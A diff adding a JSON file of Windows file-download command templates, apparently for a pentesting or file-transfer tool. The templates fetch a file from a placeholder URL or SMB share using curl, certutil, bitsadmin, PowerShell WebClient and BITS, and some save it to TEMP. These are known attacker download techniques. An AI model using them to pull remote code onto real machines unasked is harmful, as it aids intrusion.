@@ -1,0 +1,93 @@
+{
+  "groups": [
+    {
+      "title": "cmd.exe (HTTP)",
+      "tag": "HTTP",
+      "items": [
+        {
+          "id": "curl",
+          "template": "curl.exe -o \"{{filename}}\" \"{{url}}\""
+        },
+        {
+          "id": "certutil",
+          "template": "certutil -urlcache -split -f \"{{url}}\" \"{{filename}}\""
+        },
+        {
+          "id": "bitsadmin",
+          "template": "bitsadmin /transfer dl /download /priority normal \"{{url}}\" \"{{filename}}\""
+        }
+      ]
+    },
+    {
+      "title": "PowerShell (HTTP)",
+      "tag": "HTTP",
+      "items": [
+        {
+          "id": "ps_iwr",
+          "template": "powershell -NoP -C \"Invoke-WebRequest -Uri \\\"{{url}}\\\" -OutFile \\\"{{filename}}\\\"\""
+        },
+        {
+          "id": "ps_bits",
+          "template": "powershell -NoP -C \"Start-BitsTransfer -Source \\\"{{url}}\\\" -Destination \\\"{{filename}}\\\"\""
+        },
+        {
+          "id": "ps_webclient1",
+          "template": "powershell -NoLogo -Command \"$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('{{url}}', '{{filename}}')\""
+        },
+        {
+          "id": "ps_webclient2",
+          "template": "powershell.exe -c (new-object System.Net.WebClient).DownloadFile('{{url}}','{{filename}}')"
+        },
+        {
+          "id": "ps_wget",
+          "template": "powershell.exe wget \"{{url}}\" -outfile \"{{filename}}\""
+        }
+      ]
+    },
+    {
+      "title": "from within PowerShell",
+      "tag": "inline",
+      "items": [
+        {
+          "id": "ps_inline_iwr",
+          "template": "Invoke-WebRequest -Uri '{{url}}' -OutFile '{{filename}}'"
+        },
+        {
+          "id": "ps_inline_wc_var",
+          "template": "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('{{url}}','{{filename}}')"
+        },
+        {
+          "id": "ps_inline_wc_temp",
+          "template": "(New-Object System.Net.WebClient).DownloadFile('{{url}}','${env:TEMP}\\{{filename}}')"
+        },
+        {
+          "id": "ps_inline_bits",
+          "template": "Start-BitsTransfer -Source '{{url}}' -Destination '{{filename}}'"
+        }
+      ]
+    },
+    {
+      "title": "SMB",
+      "tag": "CIFS",
+      "items": [
+        {
+          "id": "smb_copy",
+          "template": "copy \"\\\\{{ip}}\\share\\{{filename}}\" ."
+        },
+        {
+          "id": "smb_ps",
+          "template": "powershell -NoP -C \"Copy-Item -Path \\\"\\\\{{ip}}\\share\\{{filename}}\\\" -Destination .\""
+        }
+      ]
+    },
+    {
+      "title": "Open in browser",
+      "items": [
+        {
+          "id": "http_link",
+          "template": "start \"\" \"{{url}}\""
+        }
+      ]
+    }
+  ]
+}
